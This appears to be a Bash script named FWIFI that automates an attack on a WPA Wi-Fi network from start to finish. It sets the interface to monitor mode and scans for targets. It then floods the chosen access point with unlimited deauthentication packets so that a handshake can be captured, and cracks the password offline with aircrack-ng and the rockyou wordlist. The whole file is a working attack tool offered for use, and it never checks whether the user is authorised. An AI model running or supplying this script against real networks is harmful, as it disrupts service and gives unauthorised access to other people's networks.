#!/bin/bash
# FWIFI [F*UCK WI-FI]
# FWIFI is a Bash script designed to perform a series of penetration tests on Wi-Fi networks.
# Github : https://github.com/rofidoang03/FWIFI

clear
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root."
    exit 1
fi
echo ""
echo "    +---------------------------------------------+    "
echo "    | _____________      __.______________.___    |    "
echo "    | \_   _____/  \    /  \   \_   _____/|   |   |    "
echo "    |  |    __) \   \/\/   /   ||    __)  |   |   |    "
echo "    |  |     \   \        /|   ||     \   |   |   |    "
echo "    |  \___  /    \__/\  / |___|\___  /   |___|   |    "
echo "    |      \/          \/           \/ F*CK WI-FI |    "
echo "    |       https://github.com/rofidoang03/fwifi  |    "
echo "    +---------------------------------------------+    "
echo ""
read -p "Enter the name of the wireless interface (e.g., wlan0): " interface
if [[ -z "$interface" ]]; then
    echo "Interface name cannot be empty."
    exit 1
fi
if ! iwconfig "$interface" >> /dev/null 2>&1; then
    echo "Invalid interface. Please provide a valid wireless interface name."
    exit 1
fi
airmon-ng check kill ; airmon-ng start "$interface"
airodump-ng "$interface"
echo ""
read -p "Enter the BSSID of the target network: " bssid
if [[ -z "$bssid" ]]; then
    echo "BSSID cannot be empty."
    exit 1
fi
if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "Invalid BSSID format. Please enter a BSSID in the format XX:XX:XX:XX:XX:XX."
    exit 1
fi

read -p "Enter the channel number: " channel
if [[ -z "$channel" ]]; then
    echo "Channel cannot be empty."
    exit 1
fi
if ! [[ "$channel" =~ ^[0-9]+$ ]]; then
    echo "Invalid channel. Please enter a valid channel number."
    exit 1
fi
iwconfig "$interface" channel "$channel"
timestamp=$(date +"%Y-%m-%d_%H:%M:%S")
output_file="${bssid}_${timestamp}"
xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
file_pcap="$output_file-01.cap"
if [ ! -f "$file_pcap" ]; then
    echo "Capture file '$file_pcap' not found."
    exit 1
fi
echo ""
handshakes=$(tshark -r "$file_pcap" -Y "eapol" -T fields -e wlan.bssid -e wlan.da -e wlan.sa -e eapol.keydes.type -E occurrence=f | wc -l)
if [[ $handshakes -gt 0 ]]; then
    read -p "Do you want to use the default wordlist (rockyou.txt)? [Y/n] " use_default_wordlist
    if [[ $use_default_wordlist == "n" || $use_default_wordlist == "N" ]]; then
        read -p "Enter the name of the custom wordlist: " custom_wordlist
        wordlist_option="-w $custom_wordlist"
    else
        wordlist_option="-w wordlists/rockyou.txt"
    fi
    aircrack-ng $wordlist_option "$output_file-01.cap"
    # aircrack-ng -w "wordlists/rockyou.txt" "$output_file-01.cap"
    exit 0
else
    echo ""
    echo "File '$file_pcap' does not contain enough handshakes to be cracked with aircrack-ng."
    exit 1
fi
